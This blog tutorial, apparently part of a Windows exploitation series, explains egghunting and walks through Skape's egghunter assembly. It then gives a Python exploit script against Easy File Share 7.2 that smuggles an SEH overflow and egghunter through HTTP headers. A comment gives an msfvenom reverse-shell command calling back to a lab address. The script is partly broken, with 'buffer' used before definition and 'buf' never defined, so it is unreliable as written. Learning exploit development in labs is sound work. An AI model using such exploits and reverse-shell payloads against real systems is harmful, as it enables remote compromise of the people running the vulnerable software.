---
layout: post
title:  "Windows Exploitation Part IV"
date:   2020-1-1 00:04:00 +0000
categories: Windows-Exploitation
---

# Windows Exploitation Part IV - Egghunting
For this part, we will need to use all the knowledge weve gained in all the parts before this. This particular exploit will be a stack buffer overflow with seh and what we will learn to be an egg and an egghunter.

# What is egghunting?
When we wish to exploit an application with limited buffer space, our shellcode may not be able to execute. Egghunting is a method of storing and retrieving the shellcode within memory that uses a stored word or 'egg'.
We then introduce a small piece of assembly to search the entire stack frame for that egg, since we prepad our shellcode with the egg, once the code finds and jumps to the next instruction, our shellcode should execute.
When running the egghunter, we will notice that windows system resources will spike, this is due to the egghunter searching the entirety of the stack, the spike will subside once the egg is found or the memory is depleted.

# Egghunter assembly
Im going to attempt to make sense of a sample egghunter so hopefully it makes sense. Im not an amazing assembly god but this should make sense to anyone. This particular sample is from the Skape guide which ill reference later.

Assembly breakdown:
```

00000000	6681CAFF0F	or dx, 0xfff	# OR DX with 4096
00000005	42		inc edx		# INCREMENT edx
00000006	52		push edx	# PUSH edx
00000007	6A43		push byte +0x43	# PUSH the byte at +0x43
00000009	58		pop eax		# POP eax
0000000A	CD2E		int 0x2e	# INTERUPT (ntdll)
0000000C	3C05		cmp al, 0x5	# COMPARE AL to 5
0000000E	5A		pop edx		# POP edx
0000000F	74EF		jz 0x0		# Jump if Zero
00000011	B890505090	mov eax, 0x50909050	# MOVE egg to eax
00000016	8BFA		mov edi, edx	# MOVE edx to edi
00000018	AF		scasd		# SCAN(cmp eax with edi)
00000019	75EA		jnz 0x5		# Jump if Not Zero (to 5)
0000001B	AF		scasd		# SCAN(cmp eax with edi)
0000001C	75E7		jnz 0x5		# Jump if Not Zero(to 5)
0000001E	FFE7		jmp edi		# Jump to edi # both ifs
```

# TL;DR
is that this piece of code will slowly increment through the stack space looking for a stored word (commonly 'W00T', as it is highly unlikely to appear normally). You will notice that there are 2 checks, this is because there is instances where the hunter may find parts of itself or other remnants
Two checks means we need to prepend 2 eggs to the beginning of our shellcode. Once the 2 checks are met, the egghunter jumps to the top of our shellcode and we get execution.

# Exploit building
Now that we know a little about how things _should_ work, we should test this out. The application i first learnt to do this method of exploitation on is 'Easy File Share 7.2' and as mentioned before, we will need to use what we learnt about SEH and buffer overflows to work this.



# Putting it all together
Final exploit should look something like this, ive kept all the rubbish from dev in as a reference.
{% highlight python %}
import socket
rhost = "192.168.9.147" # vm local address
rport = 80

max_size = 5000
seh_off = 4059
eax_off = 4183
nseh = "\x90\x90\xeb\x0a" # short jump by 10 bytes over seh
seh = "\xf2\x95\x01\x10" # POP POP RET (0x100195f2)
pad = "A" * (eax_off - len(buffer))
pad += "DDDD"

# pattern buffer was removed.
#buffer = "A" * (max_size - len(buffer))
'''#bad char checks -> \x00 & \x3b are bad
charchexhere
'''
#egg = w00t (*2)
hunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
hunter +="\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.9.135 LPORT=443 -b "\x00\x3b" -f python
#non meterpreter non staged payload


# Setting up our delivery
httprequest = (
"GET / HTTP/1.1\r\n"
"User-Agent: w00tw00t" + buf + "\r\n"
"Host:" + rhost + ":" + str(rport) + "\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: en-us\r\n"
"Accept-Encoding: gzip, deflate\r\n"
"Referer: http://" + rhost + "/\r\n"
"Cookie: SESSIONID=6671; UserID=" + buffer + nseh + seh + "A"*8 + hunter + pad + ";PassWD=;\r\n"
"Connection: Keep-Alive\r\n\r\n"
)

# socket setup to send payload to remote host
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[!] sending payload"
s.connect((rhost,rport))
print "[!] Sent!"
s.send(httprequest)
s.close
{% endhighlight %}

# Extra Resources
[Skape - the og egghunting guide](link)
[Corelan Team egghunting guide](link)
[Easy File Share 7.2 download](link)

# Next
Not too sure what to cover next, either going to continue this style and cover ROP / x64 or go deeper and look into more kernel-y stuff.

<br>
Windows Exploitation:
[I](/windows-exploitation/2019/12/31/WinExplP1.html)	[II](/windows-exploitation/2019/12/31/WinExplP2.html)	[III](/windows-exploitation/2019/12/31/WinExplP3.html)	[IV](/windows-exploitation/2019/12/31/WinExplP4.html)	[V](/windows-exploitation/2019/12/31/WinExplP5.html)



